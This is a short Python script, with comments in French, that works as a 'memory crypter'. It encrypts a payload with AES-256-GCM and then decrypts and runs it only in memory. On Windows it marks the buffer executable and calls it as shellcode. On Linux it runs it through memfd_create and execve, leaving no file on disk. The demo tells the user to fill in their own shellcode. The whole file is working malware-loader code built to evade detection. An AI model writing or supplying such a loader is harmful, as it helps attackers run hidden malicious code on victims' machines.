# Memory crypter AES-256-GCM — déchiffrement en RAM uniquement
# deps: pycryptodome
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
import ctypes, sys, os

PASSWORD = b"FILL_YOUR_PASSWORD_HERE"  # FILL

def derive_key(pw: bytes, salt: bytes) -> bytes:
    return PBKDF2(pw, salt, dkLen=32, count=200_000)

def encrypt(payload: bytes):
    salt   = get_random_bytes(16)
    key    = derive_key(PASSWORD, salt)
    cipher = AES.new(key, AES.MODE_GCM)
    ct, tag = cipher.encrypt_and_digest(payload)
    return salt, cipher.nonce, tag, ct

def decrypt_and_run(salt: bytes, nonce: bytes, tag: bytes, ct: bytes):
    payload = AES.new(derive_key(PASSWORD,salt), AES.MODE_GCM,
                      nonce=nonce).decrypt_and_verify(ct, tag)
    if sys.platform == "win32":
        buf  = ctypes.create_string_buffer(payload, len(payload))
        ptr  = ctypes.cast(buf, ctypes.c_void_p)
        old  = ctypes.c_ulong(0)
        ctypes.windll.kernel32.VirtualProtect(ptr,len(payload),0x40,ctypes.byref(old))
        ctypes.cast(buf, ctypes.CFUNCTYPE(ctypes.c_void_p))()
    else:
        fd = os.memfd_create("payload", 0)
        os.write(fd, payload); os.lseek(fd, 0, os.SEEK_SET)
        os.execve(f"/proc/self/fd/{fd}", ["payload"], os.environ)

# démo
DEMO = b"\x90" * 64  # FILL: ton shellcode
salt, nonce, tag, ct = encrypt(DEMO)
print(f"[+] salt:{salt.hex()} nonce:{nonce.hex()} tag:{tag.hex()}")
print("[+] appelle decrypt_and_run(salt,nonce,tag,ct) pour exécuter")
    